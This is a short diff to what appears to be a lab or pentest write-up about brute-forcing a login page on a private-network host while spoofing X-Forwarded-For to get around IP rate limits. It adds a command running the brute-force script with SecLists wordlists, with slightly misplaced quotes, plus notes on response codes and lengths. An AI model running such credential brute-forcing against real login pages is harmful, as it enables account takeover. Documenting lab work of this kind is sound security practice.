@@ -90,8 +90,11 @@ for i in range(256):
 
 # Bruteforce with X-Forwarded-For
 
+![](image_6.png)
+![](image_7.png)
+
 ```py
-# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames usernames.txt --passwords passwords.txt
+# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
 import argparse
 import requests
 
@@ -167,5 +170,11 @@ if __name__ == "__main__":
 
 ```
 
-![](image_6.png)
-![](image_7.png)
+> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt --passwords" "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"
+
+- It shows all 200 status code
+
+![It shows all 200 status code](image_8.png)
+
+- It Shows 1770 lenth
+  ![](image_9.png)
